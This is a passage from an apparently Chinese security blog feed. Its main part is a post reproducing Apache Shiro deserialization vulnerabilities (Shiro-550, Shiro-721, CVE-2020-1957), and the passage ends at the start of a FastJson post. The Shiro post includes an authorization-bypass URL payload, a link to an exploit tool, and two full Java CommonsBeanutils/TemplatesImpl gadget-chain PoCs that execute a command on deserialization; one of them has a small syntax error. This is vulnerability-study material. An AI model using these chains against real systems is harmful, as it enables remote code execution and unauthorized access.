class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805">白日梦组长CommonsCollections反序列化</a></p><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">commons collection简介</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro反序列化</title>
    <link href="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>对shiro反序列化做一个复现</p><h2 id="cve-2016-4437shiro-550"><a class="markdownIt-Anchor" href="#cve-2016-4437shiro-550"></a> CVE-2016-4437(Shiro-550)</h2><h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3><p>Apache Shiro&lt;=1.2.4</p><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3><p>Apacha shiro 提供了remember的功能，当用户登录并选择remember时下次登录就是通过cookie进行认证。</p><p>shiro的认证机制是将接收到的cookie 进行base64解码，然后通过AES解码，最后进行反序列化。</p><p>而在Apache Shiro&lt;=1.2.4，AES的加解密密钥是<strong>硬编码</strong>在代码中，如果攻击者通过泄露或者爆破得到密钥，则可以伪造Remember的值。也就是先构造能够触发命令执行的序列化，然后AES加密，base64编码得到remember，然后以remember=这个值去访问服务端就会触发反序列化漏洞。</p><p>比如打CC链，需要有引入CommonsCollections组件</p><h2 id="cve-2019-12422shiro-721"><a class="markdownIt-Anchor" href="#cve-2019-12422shiro-721"></a> CVE-2019-12422(Shiro-721)</h2><h3 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> 影响版本</h3><p>1.2.5,<br />1.2.6,<br />1.3.0,<br />1.3.1,<br />1.3.2,<br />1.4.0-RC2,<br />1.4.0,<br />1.4.1</p><h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h3><p>相较于Shiro-550，Shiro-721的AES加密是AES-CBC，key是系统动态生成的，所以是猜不到的。</p><p>Padding Oracle Attack攻击可以实现破解AES-CBC加密过程进而实现rememberMe的内容伪造。（<strong>需要提供一个正常用户Cookie中的remember值</strong>）</p><p>上面两个CVE的利用工具</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/">GitHub - feihong-cs/ShiroExploit-Deprecated: Shiro550/Shiro721 一键化利用工具，支持多种回显方式</a></p><h2 id="cve-2020-1957"><a class="markdownIt-Anchor" href="#cve-2020-1957"></a> CVE-2020-1957</h2><h3 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h3><p>Apache Shiro &lt; 1.5.1</p><h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h3><p>这个是一个鉴权漏洞。</p><p>Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p><h3 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h3><p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p><h2 id="commons-collectionscommon-beanutils链利用"><a class="markdownIt-Anchor" href="#commons-collectionscommon-beanutils链利用"></a> commons-collections+common-beanutils链利用</h2><p>利用链</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:readObject-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:heapify-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDown-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDownUsingComparator-&gt;BeanComparator</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:compare-&gt;PropertyUtils</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:-&gt;getSimpleProperty-&gt;TemplatesImpl</span>链<br></code></pre></td></tr></table></figure><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" class=""><p>无参实例化时，会使用<code>this()</code> 关键字用于调用当前类的另一个构造函数，所以会调用<code>BeanComparator(String property)</code></p><p><code>BeanComparator(String property)</code>中使用了<code>ComparableComparator</code>。使用<code>ComparableComparator</code>需要引入<code>commons-collections</code>。</p><p>在<code>BeanComparator::compare</code>,</p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" class=""><p>调用了<code>PropertyUtils.getProperty</code>参数可控，</p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" class=""><p>调用了<code>PropertyUtilsBean.getProperty</code>，然后调用<code>getNestedProperty</code>，再调用<code>getSimpleProperty</code></p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class=""><p>可以设置要调用的getter方法，这里设置为调用<code>TemplatesImpl</code>的<code>getOutputProperties</code></p><h3 id="poc-2"><a class="markdownIt-Anchor" href="#poc-2"></a> POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="commonsbeanutils链利用"><a class="markdownIt-Anchor" href="#commonsbeanutils链利用"></a> CommonsBeanutils链利用</h2><p>CB链不需要依赖其他组件，shiro自身带了CommonsBeanutils组件，自身就可以完成利用。</p><h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3><p>由于<code>ComparableComparator</code>是<code>commons-collections</code>中的，所以要不想依赖CC就不能用到<code>commons-collections</code></p><p>在<code>BeanComparator</code>的构造函数中，可以通过传递两个参数（String,Comparator）来避免使用<code>commons-collections</code></p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" class=""><p>p神已经找到了可以传的<code>Comparator</code>:<code>String.CASE_INSENSITIVE_ORDER</code>，所以构造时用</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">BeanComparator beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-type">BeanComparator</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">String</span>.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><p>而<code>PriorityQueue::add</code>当添加第二个时会调用到<code>String.CASE_INSENSITIVE_ORDER</code>的<code>compare</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">String</span> s1, <span class="hljs-type">String</span> s2)</span> </span><br></code></pre></td></tr></table></figure><p>参数要求是String，所以add的时候要改成String类型。</p><h3 id="poc-3"><a class="markdownIt-Anchor" href="#poc-3"></a> POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,(String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson利用链</title>
    <link href="/2024/09/02/FastJson%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2024/09/02/FastJson%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3><p>Fastjson：1.2.22-1.2.24</p><h3 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h3><p>jdk8，springboot项目+依赖如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 